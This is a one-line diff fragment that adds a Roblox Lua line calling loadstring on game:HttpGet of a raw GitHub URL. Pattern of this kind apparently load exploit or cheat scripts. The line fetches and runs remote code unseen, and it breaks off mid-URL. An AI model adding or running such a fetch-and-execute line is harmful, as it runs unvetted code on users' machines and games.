@@ -1,0 +1,1 @@
+loadstring(game: HttpGet("https://raw.githubusercontent.com/script78/Rip/refs/heads/main/Rip_JQK
